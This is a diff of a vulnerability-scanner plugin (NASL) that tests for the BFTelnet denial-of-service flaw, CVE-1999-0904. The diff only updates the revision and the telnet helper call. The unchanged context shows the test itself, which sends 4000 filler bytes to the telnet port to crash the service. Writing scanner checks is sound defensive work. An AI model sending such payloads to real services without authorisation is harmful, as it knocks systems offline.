@@ -13,8 +13,8 @@
 if(description)
 {
  script_id(10026);
- script_version ("$Revision: 1.12 $");
  script_bugtraq_id(771);
+ script_version ("$Revision: 1.14 $");
  script_cve_id("CVE-1999-0904");
  name["english"] = "BFTelnet DoS";
  name["francais"]= "Déni de service contre BFTelnet";
@@ -67,6 +67,8 @@ Facteur de risque : Moyen";
 # The script code starts here
 #
 
+include('telnet_func.inc');
+
 port = get_kb_item("Services/telnet");
 if(!port)port = 23;
 if (get_port_state(port))
@@ -75,7 +77,7 @@ if (get_port_state(port))
 
  if (soc)
  {
-   banner = telnet_init(soc);
+   banner = telnet_negotiate(socket:soc);
    data = string(crap(4000), "\r\n");
    send(socket:soc, data:data);
    close(soc);
